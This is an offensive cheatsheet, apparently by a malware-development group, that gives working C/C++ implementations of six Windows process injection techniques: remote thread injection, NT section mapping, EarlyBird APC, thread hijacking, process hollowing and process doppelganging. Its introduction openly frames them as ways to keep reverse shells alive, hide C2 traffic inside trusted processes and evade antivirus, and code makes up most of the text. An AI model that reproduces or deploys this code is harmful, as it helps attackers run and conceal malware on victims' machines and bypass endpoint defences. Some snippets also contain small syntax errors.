# Process Code Injection Techniques Cheatsheet

## Introduction

Welcome to my latest article! Today, I’ve put together a comprehensive cheatsheet covering the most well-known techniques for injecting code into remote processes. This guide will be extensive, so let’s dive right in.

#### Why you need to use Process Code Injection?

- **Time of Living:** If you're using a reverse shell and the user runs your executable, you'll receive the shell. However, if the user closes your executable, the connection is lost. By injecting the reverse shell into a persistent process like explorer.exe, the user can close your original executable without killing your shell — because the malicious code now runs in a separate, stable process.

- **Changing the Working Process:** When your malware communicates with a C2 server, antivirus solutions can flag it — especially if it's an unknown or suspicious application making outbound requests. To avoid this, it's smart to migrate your payload to a trusted process like chrome.exe or another legitimate browser that regularly accesses the internet.

- **Creating Persistence:** You can increase your chances of staying active by injecting your payload into multiple remote processes. Even if one is terminated, others may keep the malware alive.

## Process Code Injection

![image](https://github.com/user-attachments/assets/89c48b7f-6515-41a5-9f79-9aaa28c04725)

### Basic Injection

This is a basic remote process injection — just three essential steps that form the foundation for understanding the technique.

**Pros:**
  - Any…

**Cons:**
  - Very easy to detect by AV
  - Most basic technique

**Steps:**
  - Allocate memory in the remote process using `VirtualAllocEx`.
  - Write your shellcode into the allocated memory using `WriteProcessMemory`.
  - Execute the shellcode in the target process using `CreateRemoteThread`.

**Code**

```C
int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len)
{
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

    hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}
```

**VirusTotal:**

> VirusTotal\
File [Virustotal](https://www.virustotal.com/gui/file/06a0bda2800fdaf5b68ec2e54b96efeab914d00e26e27fa5c0c6732dfa190117?nocache=1)


![image](https://github.com/user-attachments/assets/c5f1674d-ac91-49af-9e2d-1102b92364ec)

**Article:**

> Process Code Injection\
Introduction [medium.com](https://medium.com/@s12deff/process-code-injection-d3ad8d0c3bbd)

---

### NT API Injection

In this technique, you create a new memory section using NtCreateSection, which holds your malicious shellcode. Then, using NtMapViewOfSection, you map (share) this memory section into the address space of a remote process.

**Pros:**
  - You only share the code, not inject shellcode directly.
  - Inject a remote view instead of raw code.
  - Provides better evasion than basic process injection.

**Cons:**
  - Detectable by AV, defenders, and EDR.

**Steps:**
  - Create new memory section
  - Copy shellcode to section
  - Create local view
  - Map remote view in target process
  - Execute shellcode remotely

#### Code

```C
int InjectVIEW(HANDLE hProc, unsigned char *payload, unsigned int payload_len)
{

    HANDLE hSection = NULL;
    PVOID pLocalView = NULL, pRemoteView = NULL;
    HANDLE hThread = NULL;
    CLIENT_ID cid;
    // create memory section
    NtCreateSection_t pNtCreateSection = (NtCreateSection_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
    if (pNtCreateSection == NULL)
        return -2;
    pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // create local section view
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
    if (pNtMapViewOfSection == NULL)
        return -2;
    pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_READWRITE);

    // throw the payload into the section
    memcpy(pLocalView, payload, payload_len);

    // create remote section view (target process)
    pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

    // execute the payload
    RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
    if (pRtlCreateUserThread == NULL)
        return -2;
    pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}
```

**ViruTotal:**

> VirusTotal\
File [virustotal.com](https://www.virustotal.com/gui/file/2c50854c278498088806523ca3f9273bc75c6687f7bf25ece1dd52bc161ad6b0?nocache=1)

![image](https://github.com/user-attachments/assets/b62f2dfc-5900-479d-9f8d-684276009b48)

**Article:**

> NT API Code Injection\
Introduction [medium.com](https://medium.com/@s12deff/nt-api-code-injection-b7dccca40710)

---

### EarlyBird APC Injection

This attack creates a new process in a suspended state, places the payload in a new memory buffer, and queues it to the APC. Once the thread is resumed, the payload executes. Unlike classic APC injection, this method allows you to control exactly when the code runs.

**Pros:**
  - Uses Asynchronous Procedure Call (APC)
  - Malicious code runs early in process initialization
  - Increases chances of bypassing AV/EDR hooks

**Cons:**
  - Well-known to AV/EDR
  - If detected, your process is terminated

**Steps:**
  - Create a legitimate process in suspended state
  - Allocate memory in the target process
  - Write shellcode to allocated memory
  - Declare APC routine pointing to shellcode
  - Queue APC to the main thread
  - Resume thread to execute shellcode
  -Shellcode executed!

**Code**

```C
int main(void)
{

    int pid = 0;
    HANDLE hProc = NULL;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    void *pRemoteCode;

    char unsigned payload[] = "PAYLOAD HERE" unsigned int payload_len = sizeof(payload)

        ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create process in status Suspended
    CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

    // Allocate memory for payload and throw it in
    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

    QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

    ResumeThread(pi.hThread);

    return 0;
}
```

**Virustotal:**

> VirusTotal\
File [virustotal.com](https://www.virustotal.com/gui/file/1b4655260a61608f961f50c2eb088df803e000169d55a70e016b0f5b5c5f5718)

![image](https://github.com/user-attachments/assets/bc1df543-a7af-4981-98eb-a2d4d4f42fa6)

**Article:**

> EarlyBird APC Code Injection\
Introduction [medium.com](https://medium.com/@s12deff/earlybird-apc-code-injection-92b302943200)

---

### Thread Hijacking Injection

This technique is effective because it doesn’t require creating a new thread — it uses an existing one. First, allocate memory in the target process using `VirtualAllocEx`, then write your payload with `WriteProcessMemory`. Next, suspend the victim thread with `SuspendThread`, modify its execution flow using `GetThreadContext` and `SetThreadContext`, and finally resume it with ResumeThread to execute your code.

**Pros:**
  - No need to create a new thread
  - Less known injection technique
  - Slightly more evasive than common methods

**Cons:**
  - Not all threads are reliable
  - Detectable by AV/EDR

**Steps:**
  - Allocate memory in remote process (`VirtualAllocEx`)
  - Write shellcode to allocated memory (`WriteProcessMemory`)
  - Suspend target thread (`SuspendThread`)
  - Set thread context to point to shellcode (`SetThreadContext`)
  - Resume thread to execute payload (`ResumeThread`)

**Code:**

```C
int InjectCTX(int pid, HANDLE hProc, unsigned char *payload, unsigned int payload_len)
{

    HANDLE hThread = NULL;
    LPVOID pRemoteCode = NULL;
    CONTEXT ctx;

    // find a thread in target process
    hThread = FindThread(pid);
    if (hThread == NULL)
    {
        printf("Error, hijack unsuccessful.\n");
        return -1;
    }

    // Decrypt payload
    AESDecrypt((char *)payload, payload_len, (char *)key, sizeof(key));

    // perform payload injection
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

    // execute the payload by hijacking a thread in target process
    SuspendThread(hThread);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
#ifdef _M_IX86
    ctx.Eip = (DWORD_PTR)pRemoteCode;
#else
    ctx.Rip = (DWORD_PTR)pRemoteCode;
#endif
    SetThreadContext(hThread, &ctx);

    return ResumeThread(hThread);
}
```

**Virustotal:**

> VirusTotal\
File [virustotal.com](https://www.virustotal.com/gui/file/a14fbd14a89af87021de232c9ed3f4e4a34872b279837f36f31f5ba6be552ea4?nocache=1)

![image](https://github.com/user-attachments/assets/47111178-8180-4010-867b-4a37a6e3e78e)

**Article:**

> Hijacking Remote Thread to Inject Code — Malware Dev\
Introduction [medium.com](https://medium.com/@s12deff/hijacking-remote-thread-to-inject-code-malware-dev-85de21ad1e0f)

---

### Process Hollowing

Process Hollowing is a straightforward technique where an attacker creates a suspended process, unmaps its original image from memory, writes a malicious binary in its place, and then resumes the process to execute the injected code.

**Pros:**
  - Advanced injection technique
  - legitimate processes

**Cons:**
  - Easily detectable by AV/EDRs

**Steps:**
  - Create a new suspended process using `CreateProcessA()` with the `CREATE_SUSPENDED` flag
  - Unmap the original process image with `NtUnmapViewOfSection()`
  - Allocate memory and write the malicious payload using `VirtualAllocEx()` and `WriteProcessMemory()`
  - Set the thread’s entry point by updating EAX with `SetThreadContext()`
  - Resume the suspended thread with `ResumeThread()` to start execution

**Code:**

```C
nt main()
{
    // create destination process - this is the process to be hollowed out
    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
    DWORD returnLenght = 0;
    CreateProcessA(NULL, (LPSTR) "c:\\windows\\syswow64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
    HANDLE destProcess = pi->hProcess;

    // get destination imageBase offset address from the PEB
    NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
    DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;

    // get destination imageBaseAddress
    LPVOID destImageBase = 0;
    SIZE_T bytesRead = NULL;
    ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);

    // read source file - this is the file that will be executed inside the hollowed process
    HANDLE sourceFile = CreateFileA("C:\\temp\\regshot.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
    LPDWORD fileBytesRead = 0;
    LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
    ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);

    // get source image size
    PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
    PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
    SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

    // carve out the destination image
    NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
    myNtUnmapViewOfSection(destProcess, destImageBase);

    // allocate new memory in destination image for the source image
    LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    destImageBase = newDestImageBase;

    // get delta between sourceImageBaseAddress and destinationImageBaseAddress
    DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

    // set sourceImageBase to destImageBase and copy the source Image headers to the destination image
    sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
    WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // get pointer to first source image section
    PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
    int err = GetLastError();

    // copy source image sections to destination
    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
        PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
        WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
        sourceImageSection++;
    }

    // get address of the relocation table
    IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    // patch the binary with relocations
    sourceImageSection = sourceImageSectionOld;
    for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        BYTE *relocSectionName = (BYTE *)".reloc";
        if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
        {
            sourceImageSection++;
            continue;
        }
        DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
        DWORD relocationOffset = 0;

        while (relocationOffset < relocationTable.Size)
        {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

            for (DWORD y = 0; y < relocationEntryCount; y++)
            {
                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (relocationEntries[y].Type == 0)
                {
                    continue;
                }

                DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
                DWORD patchedBuffer = 0;
                ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
                patchedBuffer += deltaImageBase;

                WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
                int a = GetLastError();
            }
        }
    }

    // get context of the dest process thread
    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi->hThread, context);

    // update dest image entry point to the new entry point of the source image and resume dest image thread
    DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
    context->Eax = patchedEntryPoint;
    SetThreadContext(pi->hThread, context);
    ResumeThread(pi->hThread);
    return 0;
}
```

**Virustotal:**

![image](https://github.com/user-attachments/assets/24be969c-5e10-4ae3-86dc-054df4c74911)

**Article:**

> Process Hollowing\
Introduction [medium.com](https://medium.com/@s12deff/process-hollowing-f04ab34fa185)

---

### Process Doppelganging
Process Doppelgänging is a code injection technique that exploits NTFS transaction-related Windows API calls. Because these APIs were rarely used for malicious purposes, this method has been less known to AV vendors and, as a result, was more likely to evade detection.

**Difference between Process Hollowing and Process Doppelganging**

“The Process Doppleganging, in contrary, substitutes the PE content before even the process is created. We overwrite the file image before the loading starts — so, WindowsLoader automatically takes care of the fore-mentioned steps. My sample implementation of this technique can be found here.”

**Pros:**
  - Less detectable than Process Doppelgänging
  - Modern and advanced technique

**Cons:**
  - Difficult to implemenmt

**Steps:**
  - Transact — Overwrite legitimate executable with a malicious one
  - Load — Load the malicious executable
  - Rollback — Roll back to the original executable
  - Animate — Execute the malicious code (bring the Doppelganger to life)

**Code:**

```C
#include <Windows.h>
#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "ntdll_undoc.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#include "process_env.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")

#define PAGE_SIZE 0x1000

HANDLE make_transacted_section(BYTE *payloadBuf, DWORD payloadSize)
{
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Failed to create transaction!" << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    wchar_t dummy_name[MAX_PATH] = {0};
    wchar_t temp_path[MAX_PATH] = {0};
    DWORD size = GetTempPathW(MAX_PATH, temp_path);

    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
    HANDLE hTransactedWriter = CreateFileTransactedW(dummy_name,
                                                     GENERIC_WRITE,
                                                     FILE_SHARE_READ,
                                                     NULL,
                                                     CREATE_ALWAYS,
                                                     FILE_ATTRIBUTE_NORMAL,
                                                     NULL,
                                                     hTransaction,
                                                     NULL,
                                                     NULL);
    if (hTransactedWriter == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedWriter, payloadBuf, payloadSize, &writtenLen, NULL))
    {
        std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedWriter);
    hTransactedWriter = nullptr;

    HANDLE hTransactedReader = CreateFileTransactedW(dummy_name,
                                                     GENERIC_READ,
                                                     FILE_SHARE_WRITE,
                                                     NULL,
                                                     OPEN_EXISTING,
                                                     FILE_ATTRIBUTE_NORMAL,
                                                     NULL,
                                                     hTransaction,
                                                     NULL,
                                                     NULL);
    if (hTransactedReader == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Failed to open transacted file: " << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
                                      SECTION_MAP_EXECUTE,
                                      NULL,
                                      0,
                                      PAGE_READONLY,
                                      SEC_IMAGE,
                                      hTransactedReader);
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedReader);
    hTransactedReader = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE)
    {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    return hSection;
}

bool process_doppel(wchar_t *targetPath, BYTE *payloadBuf, DWORD payloadSize)
{
    HANDLE hSection = make_transacted_section(payloadBuf, payloadSize);
    if (!hSection || hSection == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    HANDLE hProcess = nullptr;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess,          // ProcessHandle
        PROCESS_ALL_ACCESS, // DesiredAccess
        NULL,               // ObjectAttributes
        NtCurrentProcess(), // ParentProcess
        PS_INHERIT_HANDLES, // Flags
        hSection,           // sectionHandle
        NULL,               // DebugPort
        NULL,               // ExceptionPort
        FALSE               // InJob
    );
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH)
        {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = {0};

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength);
    if (status != STATUS_SUCCESS)
    {
        std::cerr << "NtQueryInformationProcess failed: " << std::hex << status << std::endl;
        return false;
    }
    PEB peb_copy = {0};
    if (!buffer_remote_peb(hProcess, pi, peb_copy))
    {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;
#ifdef _DEBUG
    std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
#endif
    DWORD payload_ep = get_entry_point_rva(payloadBuf);
    ULONGLONG procEntry = payload_ep + imageBase;

    if (!setup_process_parameters(hProcess, pi, targetPath))
    {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }
    std::cout << "[+] Process created! Pid = " << std::dec << GetProcessId(hProcess) << "\n";
#ifdef _DEBUG
    std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
#endif
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread,
                              THREAD_ALL_ACCESS,
                              NULL,
                              hProcess,
                              (LPTHREAD_START_ROUTINE)procEntry,
                              NULL,
                              FALSE,
                              0,
                              0,
                              0,
                              NULL);

    if (status != STATUS_SUCCESS)
    {
        std::cerr << "NtCreateThreadEx failed: " << std::hex << status << std::endl;
        return false;
    }

    return true;
}

int wmain(int argc, wchar_t *argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
    if (argc < 2)
    {
        std::cout << "Process Doppelganging (";
        if (is32bit)
            std::cout << "32bit";
        else
            std::cout << "64bit";
        std::cout << ")\n";
        std::cout << "params: <payload path> [*target path]\n"
                  << std::endl;
        std::cout << "* - optional" << std::endl;
        system("pause");
        return 0;
    }
    if (init_ntdll_func() == false)
    {
        return -1;
    }
    wchar_t defaultTarget[MAX_PATH] = {0};
    get_calc_path(defaultTarget, MAX_PATH, is32bit);
    wchar_t *targetPath = defaultTarget;
    if (argc >= 3)
    {
        targetPath = argv[2];
    }
    wchar_t *payloadPath = argv[1];
    size_t payloadSize = 0;

    BYTE *payloadBuf = buffer_payload(payloadPath, payloadSize);
    if (payloadBuf == NULL)
    {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }

    bool is_ok = process_doppel(targetPath, payloadBuf, (DWORD)payloadSize);

    free_buffer(payloadBuf, payloadSize);
    if (is_ok)
    {
        std::cerr << "[+] Done!" << std::endl;
    }
    else
    {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
```

**Virustotal**

![image](https://github.com/user-attachments/assets/6515e364-3b33-4dd9-923b-5aa7e1c27c31)

**Article:**

> Process Hollowing\
Introduction [medium.com](https://medium.com/@s12deff/process-doppelgänging-ff143d3d27fc)

---

## Conclusions

That’s all for my favorite process injection techniques. I hope you find this cheatsheet useful and enjoy using it!

Thanks For Reading! ;)

**- Malforge Group**
